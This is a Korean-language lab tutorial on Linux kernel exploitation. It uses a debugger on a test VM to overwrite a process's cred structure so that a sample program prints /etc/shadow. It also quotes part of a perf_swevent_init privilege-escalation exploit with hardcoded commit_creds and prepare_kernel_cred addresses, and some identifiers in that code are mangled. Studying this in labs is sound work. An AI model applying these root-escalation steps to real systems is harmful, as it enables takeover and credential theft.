
# Linux Kernel Exploit Development 3

## Introduction

* `prepare_kernel_cred()` 와 `commit_creds()`의 하드 코딩된 주소를 이용하자.<br>위의 함수들은 커널에 의해 export되고 그들의 주소는 동일 리눅스 배포 버전을 다운로드 및 설치 하거나 `/poc/kallsyms` 같은 특정 파일에 권한이 잘되어 있지 않은 경우 알아낼수있다.<br> 따라서 이런 함수들의 하드코딩된 주소들은 일반적으로 PoC code를 위해 사용된다.<br>
<br>

* thread_info structure의 주소를 찾기 위해 heuristic을 사용한다.<br>그리고 이 structure의 첫번째 포인터는 task_struct의 주소를 포함하고 있다.<br>task_struct는 cred structure의 주소를 가져 오는데 사용된다.<br>이것은 방대한 커널 버전들을 타겟으로 한 exploit을 하기위해 추천되는 방법이다.<br>
![stack](https://github.com/Kimdong0219/image/blob/master/stack.png?raw=true)
<br>

----

## Task 1

TestVM의 `./exercises/cred_struct`에서, getuid syscall을 사용하여 uid를 체크하는 간단한 user-space program을 찾을 수 있다.<br>

만약 uid가 0이라면, 이 프로그램은 /etc/shadow파일을 출력해줄 것이다.<br>

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
int main() {
uid_t uid;
uid = getuid();
printf("my uid = %d\n", uid);
if (uid == 0)
system("cat /etc/shadow");
return 0;
}
```
<br>

**`sys_getuid`에 breakpoint를 걸고 `thread_info`의 주소를 계산해라.**<br>

**`cred structure`를 얻기위해 `typecasting`을 사용할 수 있고 필요한 필드를 0으로 세팅해라.**<br>

**결과물로 `uid=0`와 `/etc/shadow`파일을 출력해라!**<br>

### 분석 시작 <br>

sys_getuid의 code를 살펴보자.<br>
<b>https://elixir.bootlin.com/linux/v4.5/source/include/linux/syscalls.h#L225</b> <br>

```c
asmlinkage long sys_getuid(void);
```
<br>

sys_getuid에는 별도로 들어가는 인자가 없다.<br>

```c
   0xffffffff81065650 <+0>:	push   rbp
   0xffffffff81065651 <+1>:	mov    rbp,rsp
   0xffffffff81065654 <+4>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81065659 <+9>:	mov    rax,QWORD PTR gs:0xc700
   0xffffffff81065662 <+18>:	mov    rax,QWORD PTR [rax+0x458]
   0xffffffff81065669 <+25>:	pop    rbp
   0xffffffff8106566a <+26>:	mov    eax,DWORD PTR [rax+0x4]
   0xffffffff8106566d <+29>:	cmp    eax,0xffffffff
   0xffffffff81065670 <+32>:	cmove  eax,DWORD PTR [rip+0xbc5259]    # 0xffffffff81c2a8d0 <overflowuid>
   0xffffffff81065677 <+39>:	mov    eax,eax
   0xffffffff81065679 <+41>:	ret
```
<br>

breakpoint를 sys_getuid에 걸어본다.<br>
![sys_getuid](https://github.com/Kimdong0219/image/blob/master/uid.png?raw=true)
<br>

```c
pwndbg> i r
rax            0x3e9	1001
rbx            0x0	0
rcx            0x7fff6fbb9450	140735067952208
rdx            0x7fff6fbb97c8	140735067953096
rsi            0x7fff6fbb97b8	140735067953080
```
<br>

rax=0x3e9의 값이 들어있는 것을 확인할 수 있다.<br>

 `0xffffffff81065659 <+9>:	mov    rax,QWORD PTR gs:0xc700`에서 보면 rax값이 gs:0xc700에서 들어오는 것으로 확인된다.<br>
 위의 그림에서 확인하듯이 gs:0xc700가 task_struct가 된다.<br>
breakpoint를 `sys_getuid+9`로 맞춰서 rax에 들어가는 task_struct를 `typecasting` 해보자.<br>

```c
pwndbg> i r
rax            0xffff880079a04500	-131939354786560 <== thread당 할당되기때문에 주소가 매번 다를수있다.
pwndbg> p (struct task_struct*)0xffff880079a04500
$1 = (struct task_struct *) 0xffff880079a04500
pwndbg> p *$1
$2 = {
  state = 0,
  stack = 0xffff880077e02000,
  usage = {
    counter = 2
  },
.....
real_cred = 0xffff880036db5d40 <== real_cred를 찾아야한다.
```
<br>

이렇게 `real_cred`의 주소를 얻어올수있다. <br>

다시 real_cred의 struct를 불러오자.<br>
 앞에서 task_struct가 \$1로 `typecasting`이 되었으므로 `$1.real_cred`로 부르면 된다.<br>

```c
pwndbg> p *$1.real_cred
$6 = {
  usage = {
    counter = 4
  },
  uid = 1001,
  gid = 1001,
  suid = 1001,
  sgid = 1001,
  euid = 1001,
  egid = 1001,
```
<br>

다음과 같이 `uid,gid,suid,sgid,euid,egid` 등등의 구조체안의 인자들을 확인할 수 있다.<br>

이제 `uid,gid,euid,egid`를 바꿔보자.<br>

```c
pwndbg> set $2.real_cred.uid=0
pwndbg> p *$2.real_cred
$9 = {
  usage = {
    counter = 4
  },
  uid = 0
```
real_cred.uid는 주소값이 아닌 자체적인 인자값이므로 (*)을 따로 붙이지 않고 바로 set해준다.<br>
같은 방식으로 `gid,euid,egid`를 바꿔보자.<br>
```c
pwndbg> set $2.real_cred.gid=0
pwndbg> set $2.real_cred.euid=0
pwndbg> set $2.real_cred.egid=0
pwndbg> p *$2.real_cred
uid = 0,
gid = 0,
euid = 0,
egid = 0,
```
**uid,gid,euid,egid가 모두 바뀌었다.**
![shadow](https://github.com/Kimdong0219/image/blob/master/shadow.png?raw=true)
<br>

#### shadow 파일 출력!

----

## Task2

`./exercises/perf`에 Ubuntu 12.04 에서 `perf_swevent_init`를 이용한 exploit 코드가 있다.<br>

이 exploit은 TestVM에 설치된 kernel version에서 `escalate privileges`에 사용될수 있다.<br>

exploit을 컴파일 해서 `root shell`을 획득하라.<br>

이 exploit은 `commit_creds()`와 `prepare_kernel_cred()`에 hardcoded 된 주소를 사용한다.<br>

```c
uint64_t targets[3][3] =
{{0xffffffff81ef67e0, // perf_swevent_enabled
0xffffffff81091630, // commit_creds
0xffffffff810918e0}, // prepare_kernel_cred
{0xffffffff81ef67a0,
0xffffffff81091220,
0xffffffff810914d0},
{0xffffffff81ef5940,
0xffffffff8107ee30,
0xffffffff8107f0c0}
};
void __attribute__((regparm(3))) payload() {
unsigned long stack, task_struct, cred;
int placeholder;
uint32_t *fixptr = (void*)AB(1);
// restore the handler
*fixptr = -1;
commit creds fn commit creds = (commit creds fn)AB(2);
prepare kernel cred fn prepare kernel cred = (prepare kernel cred fn)AB(3);
commit creds(prepare kernel cred((uint64 t)NULL));
}
```
<br>

**하드코딩된 `commit_creds()`와 `prepare_kerenel_cred()`의 주소를 제거하기 위해 이 `payload()`함수를 이용해라.<br>
 `privilege escalation paylod`는 `stack pointer`를 획득 하고 13개 bit에 masking away를 해서 `cred structure`에 위치시켜라.**<br>

 -----
 ## Task2 풀이는 다음주에!
